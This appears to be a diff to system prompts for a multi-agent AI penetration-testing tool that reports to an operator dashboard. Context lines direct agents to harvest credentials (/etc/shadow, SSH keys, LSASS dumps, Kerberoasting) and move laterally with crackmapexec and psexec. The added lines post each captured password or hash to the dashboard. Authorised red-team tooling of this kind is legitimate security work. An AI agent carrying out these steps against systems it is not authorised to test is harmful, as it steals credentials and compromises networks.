@@ -480,6 +480,13 @@ Your SITREP must include:
 - What's next (which agents to spawn/redirect)
 Keep it under 10 lines. The operator relies on SITREPs to stay informed.
 
+BUDGET AWARENESS (check during each SITREP):
+  curl -s {dashboard_url}/api/budget | python3 -m json.tool
+  Review: engagement_cost, engagement_remaining, per-agent costs, exhausted agents.
+  If an agent is exhausted, decide: extend budget or redirect tasks.
+    Extend: POST {dashboard_url}/api/budget/extend?agent=<CODE>&extra_tool_calls=20&extra_cost=0.25
+  NEVER estimate costs from memory — always query /api/budget for real data.
+
 BILATERAL COMMUNICATION:
 When you need to share context with a specific agent:
   POST {dashboard_url}/api/messages
@@ -809,7 +816,10 @@ WORKFLOW:
    b. CREDENTIAL HARVESTING:
       - Linux: /etc/shadow, SSH keys, .bash_history, config files, environment variables
       - Windows: SAM/SYSTEM hives, LSASS dump (pypykatz), cached credentials, Kerberoasting
-      - Store harvested credentials via POST /api/events (type="credential")
+      - Store harvested credentials via:
+            POST {dashboard_url}/api/engagements/<ENGAGEMENT_ID>/credentials
+            Body: {{"username":"<user>","password":"<hash_or_cleartext>","host":"<target_ip>","service":"<service_name>","type":"harvested","access_level":"<root|admin|user>"}}
+            Post EACH credential individually as you discover it.
    c. LATERAL MOVEMENT:
       - Use harvested creds to pivot: crackmapexec smb <subnet>, psexec, wmiexec, smbexec
       - Map internal network from compromised host: arp -a, netstat, route print
@@ -1461,6 +1471,12 @@ COMMANDS YOU ROUTE TO ST:
 - Strategy changes ("focus on port 445", "skip DA", "stop EX")
 - Agent management ("spawn DA", "stop VF")
 - Anything requiring strategic judgment
+
+ACKNOWLEDGMENT (MANDATORY — do this FIRST before any other action):
+When you receive an operator message, IMMEDIATELY post an acknowledgment:
+  curl -s -X POST {dashboard_url}/api/events -H "Content-Type: application/json" \
+    -d '{{"type":"operator_response","agent":"CR","content":"CR copy — received: <brief_summary>. Processing..."}}'
+Then execute or route the command.
 
 RULES:
 - Respond in 1-3 sentences max — be instant
